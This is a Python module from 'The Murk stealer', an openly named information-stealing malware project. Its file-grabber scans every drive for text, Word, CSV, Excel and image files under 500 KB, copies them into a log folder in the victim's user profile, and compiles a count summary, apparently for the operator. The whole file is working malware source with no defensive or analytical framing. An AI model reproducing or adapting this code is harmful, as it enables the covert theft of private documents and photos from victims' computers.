#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import environ,chdir,makedirs
from psutil import disk_partitions
from pathlib import Path
from os.path import getsize
from shutil import copy2
from manager.logger import Log
from preferences.config import config

def Copy(fileList, user, extension, count):
    extension = extension[4:]
    for i in range (len(fileList)):
        count+=1
        try:
            num = fileList[i].rfind("\\")
            fname = fileList[i][num+1:]
            size = getsize(fileList[i])
            try:
                makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber\\{extension[1:]}')
            except:
                pass
            if size < 500000:
                copy2(fileList[i],f'{user}\\{config.pathToLogs}\\Files\\File-Grabber\\{extension[1:]}\\{fname[:-len(extension)]}___{count}{extension}')
        except Exception as e:
            Log(f"{fname[:-len(extension)]}___{count}{extension} --> {e}")
    return count

def Grab():
    msgInfo = ""
    chdir("C:")
    try:
        user = environ['USERPROFILE']
        try:
            makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber')
        except:
            pass
        try:
            Log("===========File-grabber===========")
            msgInfo +="\n\n\n<b>📁File-grabber📁</b>"

            filesGrab = [
                ["**\*.txt", 0],
                ["**\*.docx", 0],
                ["**\*.csv", 0],
                ["**\*.xls", 0],
                ["**\*.png", 0],
                ["**\*.jpg", 0],
                ["**\*.jpeg", 0],
            ]

            drives = disk_partitions()
            for drive in drives:
                    for i in range(len(filesGrab)):
                        try:
                            pathes = list(str(_) for _ in Path(drive.device).glob(filesGrab[i][0]))
                        except Exception as e:
                            Log(drive+" search "+e)
                        try:
                            filesGrab[i][1]= Copy(pathes,user,filesGrab[i][0],filesGrab[i][1])
                        except Exception as e:
                            Log(drive+" copy "+e)
            for i in range(len(filesGrab)):
                msgInfo +=f"\n∟📄files{filesGrab[i][0][4:]}: {filesGrab[i][1]}"
            return msgInfo
        except:
            return msgInfo
    except:
            return msgInfo
